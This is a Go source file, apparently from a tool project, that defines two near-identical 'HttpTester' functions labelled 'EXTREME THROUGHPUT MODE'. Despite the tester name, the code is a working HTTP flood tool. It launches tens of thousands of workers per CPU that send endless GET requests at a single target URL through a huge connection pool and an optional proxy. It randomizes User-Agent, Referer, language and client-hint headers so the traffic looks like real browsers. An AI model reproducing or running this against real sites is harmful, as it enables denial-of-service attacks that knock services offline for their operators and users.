package connector

import (
	"context"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"path/filepath"
	"runtime"
	"runtime/debug"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

var printfWriter io.Writer = os.Stdout

// send prints to the websocket aswell
func RedirectPrintf(w io.Writer) io.Writer {
    prev := printfWriter
    if w != nil {
        printfWriter = w
    }
    return prev
}

// Expanded user agents list for better randomization
var userAgents = []string{
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.203",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
}

// Random referer URLs
var referers = []string{
    "https://www.google.com/",
    "https://www.facebook.com/",
    "https://www.twitter.com/",
    "https://www.instagram.com/",
    "https://www.reddit.com/",
    "https://www.linkedin.com/",
    "https://www.youtube.com/",
    "https://www.amazon.com/",
}

// Random accept language headers
var acceptLanguages = []string{
    "en-US,en;q=0.9",
    "en-GB,en;q=0.9",
    "en-CA,en;q=0.9",
    "en-AU,en;q=0.9",
    "fr-FR,fr;q=0.9,en;q=0.8",
    "es-ES,es;q=0.9,en;q=0.8",
    "de-DE,de;q=0.9,en;q=0.8",
    "ja-JP,ja;q=0.9,en;q=0.8",
    "zh-CN,zh;q=0.9,en;q=0.8",
}

// Volatile atomic flag for immediate stop signal
var stopFlag int32 = 0

// HttpTester: EXTREME THROUGHPUT MODE
func HttpTester(targetURL, proxyAddr string, concurrency int, timeoutSec int64, waitMs int, randomHeaders bool) {
    // Reset stop flag at the beginning
    atomic.StoreInt32(&stopFlag, 0)
    
    var sent, success, errors, timeouts, connErrors int64
    var mu sync.Mutex
    errorChan := make(chan string, 10000) // Increased buffer for error messages
    
    // Allow GC to be more aggressive when needed
    debug.SetGCPercent(20)

    // Set up OS signal handling
    sig := make(chan os.Signal, 1)
    signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)

    // Maximize CPU usage
    runtime.GOMAXPROCS(runtime.NumCPU() * 2) // Push even harder by allowing CPU oversubscription

    // Prepare URL
    parsedURL, _ := url.Parse(targetURL)
    host := parsedURL.Host

    // Create hyper-optimized transport with enormous connection pool
    dialer := &net.Dialer{
        Timeout:   2 * time.Second,     // Faster timeout for quicker retries
        KeepAlive: 60 * time.Second,    // Longer keepalives
        DualStack: true,                // Enable IPv4/IPv6
        Control: func(network, address string, c syscall.RawConn) error {
            return c.Control(func(fd uintptr) {
                // Set socket options for maximum throughput
                syscall.SetsockoptInt(int(fd), syscall.SOL_SOCKET, syscall.SO_REUSEADDR, 1)
                syscall.SetsockoptInt(int(fd), syscall.IPPROTO_TCP, syscall.TCP_NODELAY, 1)
                // Set large socket buffers
                syscall.SetsockoptInt(int(fd), syscall.SOL_SOCKET, syscall.SO_RCVBUF, 1048576)
                syscall.SetsockoptInt(int(fd), syscall.SOL_SOCKET, syscall.SO_SNDBUF, 1048576)
            })
        },
    }

    transport := &http.Transport{
        Proxy:                 http.ProxyFromEnvironment,
        DialContext:           dialer.DialContext,
        MaxIdleConns:          5000000,            // Massively increased
        MaxIdleConnsPerHost:   5000000,            // Massively increased
        MaxConnsPerHost:       5000000,            // Massively increased
        IdleConnTimeout:       90 * time.Second,
        DisableKeepAlives:     false,
        ForceAttemptHTTP2:     false,             // Disable HTTP/2 for more raw throughput
        DisableCompression:    true,              // Disable compression for speed
        TLSHandshakeTimeout:   3 * time.Second,   // Faster TLS handshake
        ExpectContinueTimeout: 1 * time.Second,
        ResponseHeaderTimeout: time.Duration(timeoutSec) * time.Second,

        ReadBufferSize:        1024 * 1024,       // 1MB read buffer
        WriteBufferSize:       1024 * 1024,       // 1MB write buffer
    }

    if proxyAddr != "" {
        proxyURL, _ := url.Parse(proxyAddr)
        transport.Proxy = http.ProxyURL(proxyURL)
    }

    // Create even more HTTP clients for better parallelism
    numClients := runtime.NumCPU() * 8 // Double from previous
    clients := make([]*http.Client, numClients)
    for i := 0; i < numClients; i++ {
        clients[i] = &http.Client{
            Transport: transport,
            Timeout:   time.Duration(timeoutSec) * time.Second,
            CheckRedirect: func(req *http.Request, via []*http.Request) error {
                return http.ErrUseLastResponse // Don't follow redirects
            },
        }
    }

    // Pre-build request template
    reqTemplate, _ := http.NewRequest("GET", targetURL, nil)
    
    // Basic headers that will be present in all requests
    reqTemplate.Header.Set("User-Agent", userAgents[0])
    reqTemplate.Header.Set("Connection", "keep-alive")
    reqTemplate.Header.Set("Host", host)
    reqTemplate.Header.Set("Accept", "*/*")
    
    // Set up a dedicated stop file watcher with frequent polling
    stopChan := make(chan struct{})
    go func() {
        // Check multiple stop file paths for better reliability
        stopFiles := []string{
            filepath.Join(".", ".stop-runner"),
            filepath.Join(".", ".stop"),
            filepath.Join("data", ".stop"),
            filepath.Join("/tmp", "enidu.stop"),
        }
        
        ticker := time.NewTicker(100 * time.Millisecond) // Check every 100ms
        defer ticker.Stop()
        
        for {
            select {
            case <-ticker.C:
                // Check all possible stop file locations
                for _, path := range stopFiles {
                    if _, err := os.Stat(path); err == nil {
                        fmt.Fprintf(printfWriter, "\n⚠️ STOP FILE DETECTED: %s - SHUTTING DOWN\n", path)
                        atomic.StoreInt32(&stopFlag, 1)
                        close(stopChan)
                        return
                    }
                }
            case <-sig:
                fmt.Fprintf(printfWriter, "\n⚠️ INTERRUPT SIGNAL DETECTED - SHUTTING DOWN\n")
                atomic.StoreInt32(&stopFlag, 1)
                close(stopChan)
                return
            }
        }
    }()

    // Error printer goroutine
    go func() {
        for err := range errorChan {
            if atomic.LoadInt32(&stopFlag) == 1 {
                continue // Skip printing errors during shutdown
            }
            mu.Lock()
            fmt.Fprintf(printfWriter, "\nERROR: %s", err)
            mu.Unlock()
        }
    }()

    // Enhanced stats printer with more metrics
    go func() {
        var lastSent, lastSuccess, lastErrors int64
        startTime := time.Now()
        
        for {
            if atomic.LoadInt32(&stopFlag) == 1 {
                fmt.Fprintf(printfWriter, "\n⚠️ SERVICE STOPPING: Shutting down stats printer\n")
                return
            }
            
            time.Sleep(1 * time.Second)
            curSent := atomic.LoadInt64(&sent)
            curSuccess := atomic.LoadInt64(&success)
            curErrors := atomic.LoadInt64(&errors)
            curTimeouts := atomic.LoadInt64(&timeouts)
            curConnErrors := atomic.LoadInt64(&connErrors)
            
            duration := time.Since(startTime).Seconds()
            overallRPS := float64(curSent) / duration
            
            mu.Lock()
            fmt.Fprintf(printfWriter, "\rRuntime: %.1fs | Reqs: %d (RPS: %d | Avg: %.1f) | Success: %d (%d/s) | Errors: %d (%d/s) | Timeouts: %d | ConnErrs: %d",
                duration,
                curSent, curSent-lastSent, overallRPS,
                curSuccess, curSuccess-lastSuccess,
                curErrors, curErrors-lastErrors,
                curTimeouts, curConnErrors)
            mu.Unlock()

            lastSent = curSent
            lastSuccess = curSuccess
            lastErrors = curErrors
        }
    }()

    // Create MASSIVE worker pools
    workersPerCPU := 10000 // 2x more than before
    totalWorkers := runtime.NumCPU() * workersPerCPU * concurrency

    fmt.Fprintf(printfWriter, "🚀 EXTREME MODE: Launching %d workers across %d CPUs against %s...\n",
        totalWorkers, runtime.NumCPU(), targetURL)
    fmt.Fprintf(printfWriter, "⚠️ Target: %s | Concurrency: %d | Workers: %d | Timeout: %ds\n", 
        targetURL, concurrency, totalWorkers, timeoutSec)

    // Pre-create worker buffers for read efficiency
    bufPool := sync.Pool{
        New: func() interface{} {
            return make([]byte, 8192) // Larger buffer for efficiency
        },
    }

    // Launch workers with improved logic
    var wg sync.WaitGroup
    wg.Add(totalWorkers)
    
    for i := 0; i < totalWorkers; i++ {
        go func(workerID int) {
            defer wg.Done()
            
            // Each worker uses a client based on its ID for better distribution
            client := clients[workerID%numClients]
            buffer := bufPool.Get().([]byte)
            defer bufPool.Put(buffer)
            
            // Create a local RNG for this worker to avoid contention
            localRand := rand.New(rand.NewSource(time.Now().UnixNano() + int64(workerID)))

            // Custom retry and backoff logic
            retryMax := 3
            backoffBase := 50 * time.Millisecond

            for atomic.LoadInt32(&stopFlag) == 0 {
                // Clone the template request for each use
                req := reqTemplate.Clone(reqTemplate.Context())
                
                // Apply random headers if enabled
                if randomHeaders {
                    // Random user agent
                    req.Header.Set("User-Agent", userAgents[localRand.Intn(len(userAgents))])
                    
                    // Add random cache control
                    cacheValues := []string{"no-cache", "max-age=0", "no-store", "must-revalidate"}
                    req.Header.Set("Cache-Control", cacheValues[localRand.Intn(len(cacheValues))])
                    
                    // Random referer
                    if localRand.Intn(10) > 2 { // 70% chance to include referer
                        req.Header.Set("Referer", referers[localRand.Intn(len(referers))])
                    }
                    
                    // Random accept-language
                    req.Header.Set("Accept-Language", acceptLanguages[localRand.Intn(len(acceptLanguages))])
                    
                    // Random client hints
                    if localRand.Intn(10) > 5 {
                        req.Header.Set("Sec-CH-UA", "\"Google Chrome\";v=\"115\", \"Chromium\";v=\"115\", \"Not:A-Brand\";v=\"99\"")
                        req.Header.Set("Sec-CH-UA-Mobile", "?0")
                        req.Header.Set("Sec-CH-UA-Platform", "\"Windows\"")
                    }
                    
                    // Add custom X-headers with random values
                    if localRand.Intn(10) > 7 { // 30% chance
                        req.Header.Set(fmt.Sprintf("X-Custom-%d", localRand.Intn(999)), 
                                        fmt.Sprintf("value-%d", localRand.Intn(99999)))
                    }
                    
                    // Add various request timing headers
                    if localRand.Intn(10) > 8 { // 20% chance
                        req.Header.Set("Sec-Fetch-Dest", "document")
                        req.Header.Set("Sec-Fetch-Mode", "navigate")
                        req.Header.Set("Sec-Fetch-Site", "cross-site")
                    }
                }

                // Wait delay if specified
                if waitMs > 0 {
                    jitter := float64(waitMs) * 0.2 // 20% jitter
                    adjustedWait := waitMs + int(localRand.Float64()*jitter - jitter/2)
                    if adjustedWait > 0 {
                        time.Sleep(time.Duration(adjustedWait) * time.Millisecond)
                    }
                }
                
            // Retry logic with exponential backoff
            var resp *http.Response
            var err error
                
                for retry := 0; retry < retryMax; retry++ {
                    // Check stop flag before each attempt
                    if atomic.LoadInt32(&stopFlag) == 1 {
                        return
                    }
                    
                    resp, err = client.Do(req)
                    atomic.AddInt64(&sent, 1)
                    
                    if err == nil && resp.StatusCode >= 200 && resp.StatusCode < 300 {
                       
                        break
                    }
                    
                    // If it's not a connection error or we've run out of retries, stop retrying
                    if err == nil || !isConnectionError(err) || retry == retryMax-1 {
                        break
                    }
                    
                    // Exponential backoff with jitter
                    backoff := backoffBase * time.Duration(1<<retry)
                    jitter := time.Duration(localRand.Int63n(int64(backoff) / 2))
                    time.Sleep(backoff + jitter)
                }
                
                if err != nil {
                    if os.IsTimeout(err) || strings.Contains(err.Error(), "timeout") || 
                       strings.Contains(err.Error(), "deadline exceeded") {
                        atomic.AddInt64(&timeouts, 1)
                        // Only sample some timeout errors to avoid flooding
                        if localRand.Intn(100) < 5 { // Log only 5% of timeouts
                            errorChan <- fmt.Sprintf("Worker %d: Timeout: %v\n", workerID, err)
                        }
                    } else if isConnectionError(err) {
                        atomic.AddInt64(&connErrors, 1)
                        // Only sample some connection errors
                        if localRand.Intn(100) < 5 { // Log only 5% of conn errors
                            errorChan <- fmt.Sprintf("Worker %d: Connection error: %v\n", workerID, err)
                        }
                    } else {
                        // Log all other errors
                        errorChan <- fmt.Sprintf("Worker %d: Request failed: %v\n", workerID, err)
                    }
                    atomic.AddInt64(&errors, 1)
                } else if resp != nil {
                    if resp.StatusCode >= 200 && resp.StatusCode < 300 {
                        atomic.AddInt64(&success, 1)
                    } else {
                        atomic.AddInt64(&errors, 1)
                        // Only sample some HTTP errors
                        if localRand.Intn(100) < 20 { // Log only 20% of HTTP errors
                            errorChan <- fmt.Sprintf("Worker %d: HTTP %d: %s\n", workerID, resp.StatusCode, resp.Status)
                        }
                    }
                    // Always drain and close the body
                    io.CopyBuffer(io.Discard, resp.Body, buffer)
                    resp.Body.Close()
                }
            }
            
            // Worker exiting
            if workerID % 1000 == 0 {
                fmt.Fprintf(printfWriter, "\nWorker %d shutting down...\n", workerID)
            }
        }(i)
    }

    // Wait for stop signal from either file watcher or OS signal
    select {
    case <-stopChan:
        // Stop signal received
    }

    // Signal all workers to stop
    atomic.StoreInt32(&stopFlag, 1)
    fmt.Fprintf(printfWriter, "\n⚠️ SERVICE STOPPING: Signal received, shutting down all workers...\n")
    
    // Wait for all workers with a timeout
    waitChan := make(chan struct{})
    go func() {
        wg.Wait()
        close(waitChan)
    }()
    
    // Give workers up to 5 seconds to gracefully exit
    select {
    case <-waitChan:
        fmt.Fprintf(printfWriter, "\n✅ SERVICE STOPPING: All workers exited gracefully\n")
    case <-time.After(5 * time.Second):
        fmt.Fprintf(printfWriter, "\n⚠️ SERVICE STOPPING: Forcing shutdown after timeout\n")
    }

    // Print final stats
    fmt.Fprintf(printfWriter, "\n\n💥 HttpTester EXTREME MODE stopped. Final stats: Sent: %d | Success: %d | Errors: %d | Timeouts: %d | ConnErrs: %d\n",
        atomic.LoadInt64(&sent), atomic.LoadInt64(&success),
        atomic.LoadInt64(&errors), atomic.LoadInt64(&timeouts),
        atomic.LoadInt64(&connErrors))

    // Close error channel
    close(errorChan)
    
    // Clean up all stop files
    cleanupStopFiles()
}

// HttpTesterWithContext: EXTREME THROUGHPUT MODE WITH CONTEXT
func HttpTesterWithContext(
    ctx context.Context,
    targetURL string, 
    proxyAddr string, 
    concurrency int, 
    timeoutSec int64, 
    waitMs int, 
    randomHeaders bool,
) {
    // Reset stop flag at the beginning
    atomic.StoreInt32(&stopFlag, 0)
    
    var sent, success, errors, timeouts, connErrors int64
    var mu sync.Mutex
    errorChan := make(chan string, 10000) // Increased buffer for error messages
    
    // Allow GC to be more aggressive when needed
    debug.SetGCPercent(20)

    // Set up OS signal handling
    sig := make(chan os.Signal, 1)
    signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)

    // Maximize CPU usage
    runtime.GOMAXPROCS(runtime.NumCPU() * 2) // Push even harder by allowing CPU oversubscription

    // Prepare URL
    parsedURL, _ := url.Parse(targetURL)
    host := parsedURL.Host

    // Create hyper-optimized transport with enormous connection pool
    dialer := &net.Dialer{
        Timeout:   2 * time.Second,     // Faster timeout for quicker retries
        KeepAlive: 60 * time.Second,    // Longer keepalives
        DualStack: true,                // Enable IPv4/IPv6
        Control: func(network, address string, c syscall.RawConn) error {
            return c.Control(func(fd uintptr) {
                // Set socket options for maximum throughput
                syscall.SetsockoptInt(int(fd), syscall.SOL_SOCKET, syscall.SO_REUSEADDR, 1)
                syscall.SetsockoptInt(int(fd), syscall.IPPROTO_TCP, syscall.TCP_NODELAY, 1)
                // Set large socket buffers
                syscall.SetsockoptInt(int(fd), syscall.SOL_SOCKET, syscall.SO_RCVBUF, 1048576)
                syscall.SetsockoptInt(int(fd), syscall.SOL_SOCKET, syscall.SO_SNDBUF, 1048576)
            })
        },
    }

    transport := &http.Transport{
        Proxy:                 http.ProxyFromEnvironment,
        DialContext:           dialer.DialContext,
        MaxIdleConns:          5000000,            // Massively increased
        MaxIdleConnsPerHost:   5000000,            // Massively increased
        MaxConnsPerHost:       5000000,            // Massively increased
        IdleConnTimeout:       90 * time.Second,
        DisableKeepAlives:     false,
        ForceAttemptHTTP2:     false,             // Disable HTTP/2 for more raw throughput
        DisableCompression:    true,              // Disable compression for speed
        TLSHandshakeTimeout:   3 * time.Second,   // Faster TLS handshake
        ExpectContinueTimeout: 1 * time.Second,
        ResponseHeaderTimeout: time.Duration(timeoutSec) * time.Second,

        ReadBufferSize:        1024 * 1024,       // 1MB read buffer
        WriteBufferSize:       1024 * 1024,       // 1MB write buffer
    }

    if proxyAddr != "" {
        proxyURL, _ := url.Parse(proxyAddr)
        transport.Proxy = http.ProxyURL(proxyURL)
    }

    // Create even more HTTP clients for better parallelism
    numClients := runtime.NumCPU() * 8 // Double from previous
    clients := make([]*http.Client, numClients)
    for i := 0; i < numClients; i++ {
        clients[i] = &http.Client{
            Transport: transport,
            Timeout:   time.Duration(timeoutSec) * time.Second,
            CheckRedirect: func(req *http.Request, via []*http.Request) error {
                return http.ErrUseLastResponse // Don't follow redirects
            },
        }
    }

    // Pre-build request template
    reqTemplate, _ := http.NewRequest("GET", targetURL, nil)
    
    // Basic headers that will be present in all requests
    reqTemplate.Header.Set("User-Agent", userAgents[0])
    reqTemplate.Header.Set("Connection", "keep-alive")
    reqTemplate.Header.Set("Host", host)
    reqTemplate.Header.Set("Accept", "*/*")
    
    // Set up a dedicated stop file watcher with frequent polling
    stopChan := make(chan struct{})
    go func() {
        // Check multiple stop file paths for better reliability
        stopFiles := []string{
            filepath.Join(".", ".stop-runner"),
            filepath.Join(".", ".stop"),
            filepath.Join("data", ".stop"),
            filepath.Join("/tmp", "enidu.stop"),
        }
        
        ticker := time.NewTicker(100 * time.Millisecond) // Check every 100ms
        defer ticker.Stop()
        
        for {
            select {
            case <-ticker.C:
                // Check all possible stop file locations
                for _, path := range stopFiles {
                    if _, err := os.Stat(path); err == nil {
                        fmt.Fprintf(printfWriter, "\n⚠️ STOP FILE DETECTED: %s - SHUTTING DOWN\n", path)
                        atomic.StoreInt32(&stopFlag, 1)
                        close(stopChan)
                        return
                    }
                }
            case <-sig:
                fmt.Fprintf(printfWriter, "\n⚠️ INTERRUPT SIGNAL DETECTED - SHUTTING DOWN\n")
                atomic.StoreInt32(&stopFlag, 1)
                close(stopChan)
                return
            }
        }
    }()

    // Error printer goroutine
    go func() {
        for err := range errorChan {
            if atomic.LoadInt32(&stopFlag) == 1 {
                continue // Skip printing errors during shutdown
            }
            mu.Lock()
            fmt.Fprintf(printfWriter, "\nERROR: %s", err)
            mu.Unlock()
        }
    }()

    // Enhanced stats printer with more metrics
    go func() {
        var lastSent, lastSuccess, lastErrors int64
        startTime := time.Now()
        
        for {
            if atomic.LoadInt32(&stopFlag) == 1 {
                fmt.Fprintf(printfWriter, "\n⚠️ SERVICE STOPPING: Shutting down stats printer\n")
                return
            }
            
            time.Sleep(1 * time.Second)
            curSent := atomic.LoadInt64(&sent)
            curSuccess := atomic.LoadInt64(&success)
            curErrors := atomic.LoadInt64(&errors)
            curTimeouts := atomic.LoadInt64(&timeouts)
            curConnErrors := atomic.LoadInt64(&connErrors)
            
            duration := time.Since(startTime).Seconds()
            overallRPS := float64(curSent) / duration
            
            mu.Lock()
            fmt.Fprintf(printfWriter, "\rRuntime: %.1fs | Reqs: %d (RPS: %d | Avg: %.1f) | Success: %d (%d/s) | Errors: %d (%d/s) | Timeouts: %d | ConnErrs: %d",
                duration,
                curSent, curSent-lastSent, overallRPS,
                curSuccess, curSuccess-lastSuccess,
                curErrors, curErrors-lastErrors,
                curTimeouts, curConnErrors)
            mu.Unlock()

            lastSent = curSent
            lastSuccess = curSuccess
            lastErrors = curErrors
        }
    }()

    // Create MASSIVE worker pools
    workersPerCPU := 10000 // 2x more than before
    totalWorkers := runtime.NumCPU() * workersPerCPU * concurrency

    fmt.Fprintf(printfWriter, "🚀 EXTREME MODE: Launching %d workers across %d CPUs against %s...\n",
        totalWorkers, runtime.NumCPU(), targetURL)
    fmt.Fprintf(printfWriter, "⚠️ Target: %s | Concurrency: %d | Workers: %d | Timeout: %ds\n", 
        targetURL, concurrency, totalWorkers, timeoutSec)

    // Pre-create worker buffers for read efficiency
    bufPool := sync.Pool{
        New: func() interface{} {
            return make([]byte, 8192) // Larger buffer for efficiency
        },
    }

    // Launch workers with improved logic
    var wg sync.WaitGroup
    wg.Add(totalWorkers)
    
    for i := 0; i < totalWorkers; i++ {
        go func(workerID int) {
            defer wg.Done()
            
            // Each worker uses a client based on its ID for better distribution
            client := clients[workerID%numClients]
            buffer := bufPool.Get().([]byte)
            defer bufPool.Put(buffer)
            
            // Create a local RNG for this worker to avoid contention
            localRand := rand.New(rand.NewSource(time.Now().UnixNano() + int64(workerID)))

            // Custom retry and backoff logic
            retryMax := 3
            backoffBase := 50 * time.Millisecond

            for atomic.LoadInt32(&stopFlag) == 0 {
                // Clone the template request for each use
                req := reqTemplate.Clone(reqTemplate.Context())
                
                // Apply random headers if enabled
                if randomHeaders {
                    // Random user agent
                    req.Header.Set("User-Agent", userAgents[localRand.Intn(len(userAgents))])
                    
                    // Add random cache control
                    cacheValues := []string{"no-cache", "max-age=0", "no-store", "must-revalidate"}
                    req.Header.Set("Cache-Control", cacheValues[localRand.Intn(len(cacheValues))])
                    
                    // Random referer
                    if localRand.Intn(10) > 2 { // 70% chance to include referer
                        req.Header.Set("Referer", referers[localRand.Intn(len(referers))])
                    }
                    
                    // Random accept-language
                    req.Header.Set("Accept-Language", acceptLanguages[localRand.Intn(len(acceptLanguages))])
                    
                    // Random client hints
                    if localRand.Intn(10) > 5 {
                        req.Header.Set("Sec-CH-UA", "\"Google Chrome\";v=\"115\", \"Chromium\";v=\"115\", \"Not:A-Brand\";v=\"99\"")
                        req.Header.Set("Sec-CH-UA-Mobile", "?0")
                        req.Header.Set("Sec-CH-UA-Platform", "\"Windows\"")
                    }
                    
                    // Add custom X-headers with random values
                    if localRand.Intn(10) > 7 { // 30% chance
                        req.Header.Set(fmt.Sprintf("X-Custom-%d", localRand.Intn(999)), 
                                        fmt.Sprintf("value-%d", localRand.Intn(99999)))
                    }
                    
                    // Add various request timing headers
                    if localRand.Intn(10) > 8 { // 20% chance
                        req.Header.Set("Sec-Fetch-Dest", "document")
                        req.Header.Set("Sec-Fetch-Mode", "navigate")
                        req.Header.Set("Sec-Fetch-Site", "cross-site")
                    }
                }

                // Wait delay if specified
                if waitMs > 0 {
                    jitter := float64(waitMs) * 0.2 // 20% jitter
                    adjustedWait := waitMs + int(localRand.Float64()*jitter - jitter/2)
                    if adjustedWait > 0 {
                        time.Sleep(time.Duration(adjustedWait) * time.Millisecond)
                    }
                }
                
            // Retry logic with exponential backoff
            var resp *http.Response
            var err error
                
                for retry := 0; retry < retryMax; retry++ {
                    // Check stop flag before each attempt
                    if atomic.LoadInt32(&stopFlag) == 1 {
                        return
                    }
                    
                    resp, err = client.Do(req)
                    atomic.AddInt64(&sent, 1)
                    
                    if err == nil && resp.StatusCode >= 200 && resp.StatusCode < 300 {
                       
                        break
                    }
                    
                    // If it's not a connection error or we've run out of retries, stop retrying
                    if err == nil || !isConnectionError(err) || retry == retryMax-1 {
                        break
                    }
                    
                    // Exponential backoff with jitter
                    backoff := backoffBase * time.Duration(1<<retry)
                    jitter := time.Duration(localRand.Int63n(int64(backoff) / 2))
                    time.Sleep(backoff + jitter)
                }
                
                if err != nil {
                    if os.IsTimeout(err) || strings.Contains(err.Error(), "timeout") || 
                       strings.Contains(err.Error(), "deadline exceeded") {
                        atomic.AddInt64(&timeouts, 1)
                        // Only sample some timeout errors to avoid flooding
                        if localRand.Intn(100) < 5 { // Log only 5% of timeouts
                            errorChan <- fmt.Sprintf("Worker %d: Timeout: %v\n", workerID, err)
                        }
                    } else if isConnectionError(err) {
                        atomic.AddInt64(&connErrors, 1)
                        // Only sample some connection errors
                        if localRand.Intn(100) < 5 { // Log only 5% of conn errors
                            errorChan <- fmt.Sprintf("Worker %d: Connection error: %v\n", workerID, err)
                        }
                    } else {
                        // Log all other errors
                        errorChan <- fmt.Sprintf("Worker %d: Request failed: %v\n", workerID, err)
                    }
                    atomic.AddInt64(&errors, 1)
                } else if resp != nil {
                    if resp.StatusCode >= 200 && resp.StatusCode < 300 {
                        atomic.AddInt64(&success, 1)
                    } else {
                        atomic.AddInt64(&errors, 1)
                        // Only sample some HTTP errors
                        if localRand.Intn(100) < 20 { // Log only 20% of HTTP errors
                            errorChan <- fmt.Sprintf("Worker %d: HTTP %d: %s\n", workerID, resp.StatusCode, resp.Status)
                        }
                    }
                    // Always drain and close the body
                    io.CopyBuffer(io.Discard, resp.Body, buffer)
                    resp.Body.Close()
                }
            }
            
            // Worker exiting
            if workerID % 1000 == 0 {
                fmt.Fprintf(printfWriter, "\nWorker %d shutting down...\n", workerID)
            }
        }(i)
    }

    // Wait for stop signal from either file watcher or OS signal
    select {
    case <-stopChan:
        // Stop signal received
    }

    // Signal all workers to stop
    atomic.StoreInt32(&stopFlag, 1)
    fmt.Fprintf(printfWriter, "\n⚠️ SERVICE STOPPING: Signal received, shutting down all workers...\n")
    
    // Wait for all workers with a timeout
    waitChan := make(chan struct{})
    go func() {
        wg.Wait()
        close(waitChan)
    }()
    
    // Give workers up to 5 seconds to gracefully exit
    select {
    case <-waitChan:
        fmt.Fprintf(printfWriter, "\n✅ SERVICE STOPPING: All workers exited gracefully\n")
    case <-time.After(5 * time.Second):
        fmt.Fprintf(printfWriter, "\n⚠️ SERVICE STOPPING: Forcing shutdown after timeout\n")
    }

    // Print final stats
    fmt.Fprintf(printfWriter, "\n\n💥 HttpTester EXTREME MODE stopped. Final stats: Sent: %d | Success: %d | Errors: %d | Timeouts: %d | ConnErrs: %d\n",
        atomic.LoadInt64(&sent), atomic.LoadInt64(&success),
        atomic.LoadInt64(&errors), atomic.LoadInt64(&timeouts),
        atomic.LoadInt64(&connErrors))

    // Close error channel
    close(errorChan)
    
    // Clean up all stop files
    cleanupStopFiles()
}

// Helper to check if an error is a connection-related error
func isConnectionError(err error) bool {
    if _, ok := err.(net.Error); ok {
        return true
    }
    errStr := err.Error()
    return strings.Contains(errStr, "connection") || 
           strings.Contains(errStr, "reset") || 
           strings.Contains(errStr, "broken pipe") ||
           strings.Contains(errStr, "EOF") ||
           strings.Contains(errStr, "i/o timeout")
}

// Check for stop files in multiple locations
func shouldStop() bool {
    // Check multiple potential stop file locations
    stopFiles := []string{
        filepath.Join(".", ".stop-runner"),
        filepath.Join(".", ".stop"),
        filepath.Join("data", ".stop"),
        filepath.Join("/tmp", "enidu.stop"),
    }
    
    for _, path := range stopFiles {
        if _, err := os.Stat(path); err == nil {
            return true
        }
    }
    
    return false
}

// Clean up all stop files
func cleanupStopFiles() {
    stopFiles := []string{
        filepath.Join(".", ".stop-runner"),
        filepath.Join(".", ".stop"),
        filepath.Join("data", ".stop"),
        filepath.Join("/tmp", "enidu.stop"),
    }
    
    for _, path := range stopFiles {
        if _, err := os.Stat(path); err == nil {
            os.Remove(path)
        }
    }
}